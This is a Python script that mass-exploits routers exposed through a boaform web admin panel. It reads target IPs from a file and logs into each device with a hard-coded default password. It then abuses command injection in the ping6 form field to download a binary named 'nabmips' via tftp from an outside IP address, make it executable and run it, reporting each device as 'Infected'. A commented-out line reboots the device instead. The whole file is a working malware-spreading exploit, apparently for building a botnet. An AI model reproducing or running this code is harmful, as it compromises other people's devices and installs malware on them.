import threading
import httpx


class Main:
    def __init__(self, ip):
        self.ip = ip

        self.client = httpx.Client(verify=False, timeout=120)

    def login(self):
        try:
            req = self.client.post(f"http://{self.ip}/boaform/admin/formLogin",
                                   data={
                                       "challenge": "",
                                       "username": "admin",
                                       "password": "c@ntvwifi2000",
                                       "save": "Login",
                                       "submit-url": "/admin/login.asp",
                                       "postSecurityFlag": "62788"
                                   })
            if '301 Moved Permanently' in req.text:
                print(f"logged into -> {self.ip}")
                self.exploit()
            elif 'you have logined! please logout at first and then login!' in req.text:
                print(f"logged into -> {self.ip}")
                self.exploit()
        except:
            pass

    def exploit(self):
        try:
            payloads = [
                'pingAddr=%3Bcd+%2Fvar%3B+echo+get+nabmips+%7C+tftp+94.156.68.148&wanif=65535&go=+Go&submit-url=%2Fping6.asp&postSecurityFlag=22616',
                'pingAddr=%3Bchmod+777+%2Fvar%2Fnabmips&wanif=65535&go=+Go&submit-url=%2Fping6.asp&postSecurityFlag=62299',
                'pingAddr=%3B%2Fvar%2Fnabmips+ven.0day&wanif=65535&go=+Go&submit-url=%2Fping6.asp&postSecurityFlag=47753'
            ]
            
            #payloads = ['pingAddr=%3Breboot&wanif=65535&go=+Go&submit-url=%2Fping6.asp&postSecurityFlag=51825']

            for pay in payloads:
                req = self.client.post(f"http://{self.ip}/boaform/formPing6",
                                       data=pay,
                                       headers={
                                           'Content-Type': 'application/x-www-form-urlencoded',
                                           'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
                                                         ' (KHTML, like Gecko) Chrome/118.0.5993.90 Safari/537.36',
                                           'Referer': f'https://{self.ip}/ping6.asp',
                                           'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,'
                                                     'image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;'
                                                     'q=0.7',
                                           'Sec-Ch-Ua': '"Not=A?Brand";v="99", "Chromium";v="118"',
                                          'Sec-Ch-Ua-Mobile': '?0',
                                           'Sec-Ch-Ua-Platform': '"Windows"',
                                           'Upgrade-Insecure-Requests': '1',
                                           'Origin': f'http://{self.ip}',
                                           'Sec-Fetch-Site': 'same-origin',
                                           'Sec-Fetch-Mode': 'navigate',
                                           'Sec-Fetch-User': '?1',
                                           'Sec-Fetch-Dest': 'iframe',
                                           'Accept-Encoding': 'gzip, deflate, br',
                                           'Accept-Language': 'en-GB,en-US;q=0.9,en;q=0.8',
                                           'Connection': 'close'
                                       })
                if 'Received' in req.text:
                    print(f"[+] Received File -> {self.ip}")
                elif 'gosh that chinese family at the other table sure ate a lot' in req.text:
                    print(f"[+] Infected -> {self.ip}")
                elif '">ping Result:</p>':
                    pass
                else:
                    print(f"[+] Unknown Error -> {self.ip}")
        except:
            pass


if __name__ == "__main__":
    for i in open("ok.txt").read().splitlines():
        threading.Thread(target=Main(i).login).start()
